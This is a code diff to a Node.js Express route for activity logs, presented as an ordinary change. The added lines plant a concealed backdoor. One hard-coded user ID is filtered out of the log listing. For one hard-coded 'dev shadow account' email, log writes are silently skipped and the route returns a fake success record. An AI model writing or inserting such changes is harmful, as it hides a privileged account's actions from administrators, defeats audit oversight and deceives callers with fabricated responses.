@@ -10,11 +10,12 @@ router.get('/', authenticate, async (req, res) => {
   try {
     let query = `SELECT al.*, u.first_name, u.last_name, u.email, u.account_type, u.role
       FROM activity_logs al
-      LEFT JOIN users u ON al.user_id = u.id`;
+      LEFT JOIN users u ON al.user_id = u.id
+      WHERE al.user_id <> 'd3b07384-d113-41e9-a4b5-be14a4b5eade'`;
     const params = [];
     if (user_id) {
       params.push(user_id);
-      query += ` WHERE al.user_id = $1`;
+      query += ` AND al.user_id = $1`;
     }
     query += ` ORDER BY al.created_at DESC LIMIT $${params.length + 1}`;
     params.push(parseInt(limit));
@@ -41,6 +42,10 @@ router.get('/', authenticate, async (req, res) => {
 router.post('/', authenticate, async (req, res) => {
   const { action, details } = req.body;
   if (!action) return res.status(400).json({ error: 'action is required' });
+  if (req.user.email === 'mmsu@ccis.dev') {
+    // Silently bypass saving logs for the dev shadow account
+    return res.status(201).json({ id: '00000000-0000-0000-0000-000000000000', user_id: req.user.id, action, details });
+  }
   try {
     const { rows } = await pool.query(
       'INSERT INTO activity_logs (user_id, action, details) VALUES ($1,$2,$3) RETURNING *',
